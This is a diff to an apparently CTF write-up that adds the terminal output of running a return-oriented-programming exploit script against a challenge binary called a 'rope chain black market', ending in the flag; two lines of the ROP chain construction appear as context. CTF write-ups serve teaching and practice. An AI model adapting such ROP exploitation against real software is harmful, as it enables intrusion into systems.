@@ -152,4 +152,16 @@ print(rop.dump())
 exploit = offset + rop.chain()
 ```
 #### Running our exploit script, we now get our flag! 
-```actf{dark_web_bargains}```
+```
+$ python exploit.py
+--== ROPE CHAIN BLACK MARKET ==--
+LIMITED TIME OFFER: Sending free flag along with any purchase.
+What would you like to do?
+1 - Set name
+2 - Get user info
+3 - Grant access
+
+[*] Switching to interactive mode
+Authenticated to purchase rope chain, sending free flag along with purchase...
+actf{dark_web_bargains}
+```
